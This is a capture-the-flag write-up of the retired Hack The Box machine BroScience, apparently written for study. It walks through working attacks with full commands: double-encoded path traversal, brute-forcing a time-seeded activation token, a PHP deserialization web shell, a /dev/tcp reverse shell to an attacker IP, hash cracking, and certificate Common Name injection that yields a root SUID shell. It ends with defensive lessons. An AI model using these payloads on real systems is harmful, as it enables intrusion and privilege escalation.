---
title: "Hack The Box — BroScience"
summary: "Double-encoded LFI exposes predictable activation codes and a PHP deserialization gadget; a cracked salted hash and certificate CN injection lead to root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Medium"
os: "Linux"
solvedAt: 2026-11-11
publishedAt: 2026-11-11
tags:
  - lfi
  - path-traversal
  - predictable-tokens
  - php-deserialization
  - password-cracking
  - command-injection
  - cron
  - privilege-escalation
tools:
  - Nmap
  - Feroxbuster
  - curl
  - PHP
  - PostgreSQL
  - Hashcat
  - SSH
  - OpenSSL
  - pspy
cves: []
htbUrl: "https://app.hackthebox.com/machines/BroScience"
cover: "/images/writeups/hackthebox/machines/broscience/broscience.png"
coverAlt: "Hack The Box BroScience machine logo showing a lifter inside an orange ring"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. [Hack The Box announced](https://ec.linkedin.com/posts/hackthebox_htb-hacking-hackthebox-activity-7049757688078999554-nlNM) that BroScience would retire on 8 April 2023; its [recorded retire date](https://0xdf.gitlab.io/2023/04/08/htb-broscience.html) is 8 April 2023. Flag values, activation tokens, session cookies and personal VPN addresses are omitted. The password and hash below belong only to this retired lab and are needed to reproduce the path.

## Executive summary

BroScience serves PHP over HTTPS. Its image endpoint blocks a literal `../` path but decodes the parameter again after the check, so a double-encoded traversal exposes application source. The registration code seeds PHP's pseudorandom generator with the current second; reproducing those seeds activates a new account without email. An authenticated theme cookie is base64-decoded and deserialized, and an `AvatarInterface` gadget copies attacker-chosen data into the web root. A PHP file gives code execution as `www-data`. The PostgreSQL database contains a salted MD5 hash whose cracked password also works for SSH as `bill`. Finally, a root cron job passes a certificate's Common Name into `bash -c`, allowing command injection and a root shell.

## Target information

| Item | Value |
| --- | --- |
| Target | BroScience (`broscience.htb`) |
| Platform | Hack The Box |
| Difficulty | Medium |
| Operating system | Linux |
| Publication policy | [Retired on 8 April 2023](https://0xdf.gitlab.io/2023/04/08/htb-broscience.html) |
| Main weaknesses | Double-decoded file path, time-seeded activation code, unsafe PHP deserialization, password reuse, certificate CN injection |

HTB assigns an instance IP to each player. Use the IP displayed in your own lab and the VPN IP of your attack machine:

```bash
export TARGET_IP='<YOUR_HTB_TARGET_IP>'
export ATTACKER_IP='<YOUR_HTB_VPN_IP>'
echo "$TARGET_IP broscience.htb" | sudo tee -a /etc/hosts
```

## Enumeration

I scanned all TCP ports with default scripts and version detection:

```bash
nmap "$TARGET_IP" -sC -sV -p-
```

The observed services were SSH on 22, an HTTP redirect to `https://broscience.htb/` on 80, and Apache HTTPS on 443:

```text
22/tcp   open  ssh       OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp   open  http      Apache httpd 2.4.54
443/tcp  open  ssl/http  Apache httpd 2.4.54
```

The lab certificate had expired, so the following `curl` and Feroxbuster commands use `-k` to continue the HTTPS enumeration. A focused content scan avoided recursively crawling Apache's unrelated `/manual/` directory:

```bash
feroxbuster -u https://broscience.htb/ -k -n \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak
```

### Findings

| Path | Observation |
| --- | --- |
| `/register.php` | Registration succeeded but asked for an email activation link. |
| `/activate.php` | Accepted a 32-character `code` query parameter. |
| `/includes/img.php` | Returned “Missing 'path' parameter” without a path. |
| `/includes/utils.php` | Returned an empty page when called directly; source later exposed the activation generator and deserialization gadget. |
| `/login.php` | A useful authenticated surface after activation. |

The home page loaded images through `/includes/img.php?path=bench.png`, making `path` the next parameter to test:

```bash
curl -ks https://broscience.htb/ |
  grep -oE 'includes/img\.php[^"]+' | head
```

## Initial access

### Double-encoded traversal exposes PHP source

A literal traversal was recognized and blocked:

```bash
curl -ks --path-as-is \
  'https://broscience.htb/includes/img.php?path=../../../../etc/passwd'
# <b>Error:</b> Attack detected.
```

Double encoding each `../` sequence bypassed that check. The observed behavior is consistent with PHP decoding the query parameter once and the application decoding it again after an earlier filter. The second pass turns `%2e%2e%2f` back into `../`. I confirmed the result by reading PHP source rather than guessing from a status code:

```bash
curl -ks --path-as-is \
  'https://broscience.htb/includes/img.php?path=%252e%252e%252factivate.php'

curl -ks --path-as-is \
  'https://broscience.htb/includes/img.php?path=%252e%252e%252fregister.php'

curl -ks --path-as-is \
  'https://broscience.htb/includes/img.php?path=%252e%252e%252fincludes%252futils.php'
```

The source showed that `register.php` calls `generate_activation_code()`, stores the result in PostgreSQL and constructs an activation URL. A `TODO` comment marks the email sending as unimplemented, explaining why waiting for mail cannot activate the account.

### Reproduce the activation code

The generator in `includes/utils.php` was:

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

The seed is the Unix timestamp in whole seconds. It has no username, email or cryptographic randomness. Record the time just before submitting a **new** registration in the browser, then record it again immediately afterward:

```bash
start=$(date -u +%s)
# Submit the registration form in the browser now.
end=$(date -u +%s)
```

On Kali, use PHP's own `srand` and `rand` to match the target's algorithm. The two-minute margin covers small clock differences and human timing; widen it if needed. Stop as soon as the application reports activation:

```bash
for ((ts=start-120; ts<=end+120; ts++)); do
  code=$(php -r '
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand((int)$argv[1]);
    for ($i = 0; $i < 32; $i++) {
      echo $chars[rand(0, strlen($chars) - 1)];
    }
  ' "$ts")

  response=$(curl -ksG --data-urlencode "code=$code" \
    'https://broscience.htb/activate.php')

  if grep -q 'Account activated!' <<< "$response"; then
    echo "Account activated with seed $ts"
    break
  fi
done
```

The exact token is intentionally omitted. I then logged in with the username and password chosen during registration.

### Theme cookie deserialization

The same `utils.php` source revealed that an authenticated request calls `unserialize(base64_decode($_COOKIE['user-prefs']))`. It also defined this gadget chain:

```php
class Avatar {
    public $imgPath;

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath;

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

Deserializing an `AvatarInterface` invokes `__wakeup()`, which copies data from `tmp` to `imgPath`. I first copied `/etc/hostname` to `/var/www/html/images/probe.txt` and retrieved `/images/probe.txt` to confirm the write. For code execution, I made the source a `data://` URI containing a small PHP file:

```bash
php <<'PHP'
<?php
class AvatarInterface {
    public $tmp;
    public $imgPath;
}
$php = '<?php system($_GET["cmd"] ?? "id"); ?>';
$p = new AvatarInterface();
$p->tmp = 'data://text/plain;base64,' . base64_encode($php);
$p->imgPath = '/var/www/html/images/cmd.php';
echo base64_encode(serialize($p)), PHP_EOL;
PHP
```

After logging in, I replaced the `user-prefs` cookie value in **Firefox DevTools → Storage → Cookies** with the generated base64 string and refreshed an authenticated page. The URL `/images/cmd.php` then executed the copied PHP:

```bash
curl -ksG --data-urlencode 'cmd=id' \
  'https://broscience.htb/images/cmd.php'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remove the malicious `user-prefs` cookie after it writes the file so later page loads do not repeat the copy.

### Reverse shell as `www-data`

I started a listener on Kali, then issued a command through the PHP file from another terminal:

```bash
nc -lvnp 4444
```

```bash
curl -ksG \
  --data-urlencode "cmd=bash -c \"bash -i >& /dev/tcp/${ATTACKER_IP}/4444 0>&1\"" \
  'https://broscience.htb/images/cmd.php'
```

The HTTP request can remain open while the reverse shell is connected. In the listener, `id` confirmed `www-data`. For a usable terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Privilege escalation

### PostgreSQL hash and SSH as `bill`

The web application configuration at `/var/www/html/includes/db_connect.php` contained the local PostgreSQL connection details and `$db_salt = "NaCl"`. The registration source established that passwords are stored as `md5($db_salt . $password)`. Using the database password from that file, I queried only the usernames and password hashes:

```bash
PGPASSWORD='<DB_PASSWORD_FROM_db_connect.php>' psql \
  -h 127.0.0.1 -p 5432 -U dbuser -d broscience \
  -At -F ':' -c 'SELECT username,password FROM users;'
```

The relevant record was `bill:13edad4932da9dbb57d9cd15b66ed104`. Hashcat mode 20 matches `md5($salt.$pass)`; the input format is `hash:salt`. On Kali:

```bash
printf '%s\n' '13edad4932da9dbb57d9cd15b66ed104:NaCl' > bill.hash
hashcat -m 20 -a 0 bill.hash /usr/share/wordlists/rockyou.txt
hashcat -m 20 --show bill.hash
```

The retired lab password was `iluvhorsesandgym`. It also worked for SSH:

```bash
ssh bill@broscience.htb
id
# uid=1000(bill) gid=1000(bill) groups=1000(bill)
```

The user flag was available in `/home/bill/user.txt`; its value is omitted.

### Root cron and certificate Common Name injection

`sudo -l` gave `bill` no sudo permissions. Local enumeration found `/opt/renew_cert.sh` and a writable `/home/bill/Certs` directory. The script checks whether a certificate expires within 24 hours, extracts the certificate subject and finally builds a shell command with the untrusted Common Name:

```bash
openssl x509 -in $1 -noout -checkend 86400 > /dev/null
subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
commonName=$(echo $subject | grep -Eo 'CN = .*,?')
commonName=$(echo ${commonName:5} | awk -F, '{print $1}')
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

The outer shell expands `$commonName`, then the new `bash -c` parses that value as shell syntax. A Common Name containing `$(...)` therefore runs a command. A harmless certificate with `CN=$(cd ~bill; touch cn_probe)` created `/home/bill/cn_probe` when I ran the script manually as `bill`, validating the gadget without assuming that cron had run.

The crucial scheduled argument was not visible in `/etc/crontab`. I used [pspy](https://github.com/DominicBreuker/pspy) to observe short-lived root processes. Download its official 64-bit release on Kali and copy it to the target:

```bash
curl -fL -o pspy64 \
  https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
scp pspy64 bill@broscience.htb:/tmp/pspy64
```

As `bill`, run process-only monitoring; `-f` together with `tee` in `/tmp` creates a self-reporting stream of file events and is unnecessary here:

```bash
chmod +x /tmp/pspy64
/tmp/pspy64 -i 100 |
  grep --line-buffered 'CMD: UID=0' |
  tee /tmp/rootjobs.log
```

The captured root command used a **fixed filename**:

```text
/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
```

A separate root job, `/root/webappreset.sh`, periodically removed files from `Certs`. I therefore saved the malicious certificate outside that directory and used a small loop to restore it under the required name when removed. This Common Name copies Bash to `/home/bill/rootbash` as root and sets its SUID bit. The substitution avoids literal slashes inside the OpenSSL `-subj` CN field:

```bash
openssl req -x509 -newkey rsa:2048 -sha256 -nodes -days 1 \
  -keyout /tmp/bill-renew.key \
  -out ~/renew-payload.crt \
  -subj '/C=US/ST=CA/L=LA/O=BroScience/OU=Ops/CN=$(cd ~bill; cp $(which bash) rootbash; chmod 4755 rootbash)/emailAddress=bill@broscience.htb'

openssl x509 -in ~/renew-payload.crt -noout -checkend 86400
# "Certificate will expire"; exit status 1
```

The `-days 1` certificate fails `-checkend 86400` and enters the renewal branch. Leave the following loop running through the next cron invocation:

```bash
nohup bash -c '
while [ ! -u "$HOME/rootbash" ]; do
  [ -f "$HOME/Certs/broscience.crt" ] ||
    cp "$HOME/renew-payload.crt" "$HOME/Certs/broscience.crt"
  sleep 0.2
done
' >/tmp/keep-broscience.log 2>&1 &
```

When root processes the certificate, the injected command creates a root-owned SUID Bash:

```bash
ls -l ~/rootbash
# -rwsr-xr-x 1 root root ... /home/bill/rootbash

~/rootbash -p
id
# uid=1000(bill) euid=0(root) ...
cat /root/root.txt
```

The root flag value is intentionally omitted. After verifying access, stop the pspy monitor and remove the temporary SUID shell and test files in the lab.

## What did not work

- A literal `../` traversal returned “Attack detected.” Double encoding the traversal sequence exposed PHP source.
- Registration displayed “check your email,” but the source contained only a `TODO` for sending mail. Reproducing the time-seeded token was the working route.
- Certificates named `renew.crt` and `cron-probe.crt` never reached the root renewal script. pspy showed that cron calls it only with `/home/bill/Certs/broscience.crt`.
- The separate `webappreset.sh` job removed test certificates. Keeping a copy outside `Certs` and restoring the exact filename handled that reset.

## Attack path

1. Enumerate SSH, HTTP and HTTPS; find the image endpoint and PHP account pages.
2. Use double-encoded traversal through `img.php` to read `register.php`, `activate.php` and `utils.php`.
3. Reproduce the `srand(time())` activation code for a new account and log in.
4. Replace `user-prefs` with a serialized `AvatarInterface` gadget, write PHP into the web root and obtain `www-data` code execution.
5. Query PostgreSQL, crack `bill`'s salted MD5 hash and reuse the lab password for SSH.
6. Observe the fixed root cron argument, place a malicious certificate at that path, and execute the CN payload as root.

## Lessons learned

- Decode once, canonicalize the resulting path and enforce an allowlist rooted in the intended image directory. A filter on an earlier representation of a path can be bypassed.
- Generate account activation tokens with a cryptographically secure random source and send or deliver them through a controlled channel. A timestamp-seeded PRNG makes the code searchable.
- Do not deserialize client-controlled PHP objects. Use a data-only format and validate permitted theme values; the magic `__wakeup()` method crossed directly into a file write.
- Store passwords with a dedicated password hashing function such as `password_hash()`; do not use salted MD5 or reuse application passwords for system login.
- Treat certificate subject fields as untrusted input. Avoid `bash -c` with a Common Name, quote filesystem paths, and constrain renewal jobs to trusted certificates and destinations.
- Observe the exact arguments of scheduled jobs. The fixed `broscience.crt` filename, not merely the presence of a vulnerable script, determined the successful privilege escalation.

## References

- [Hack The Box BroScience machine](https://app.hackthebox.com/machines/BroScience)
- [Hack The Box retirement announcement](https://ec.linkedin.com/posts/hackthebox_htb-hacking-hackthebox-activity-7049757688078999554-nlNM)
- [Hack The Box publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PHP documentation: `unserialize()`](https://www.php.net/manual/en/function.unserialize.php)
- [PHP documentation: `random_bytes()`](https://www.php.net/manual/en/function.random-bytes.php)
- [OpenSSL `x509` documentation](https://docs.openssl.org/3.0/man1/openssl-x509/)
- [pspy: process monitoring without root](https://github.com/DominicBreuker/pspy)
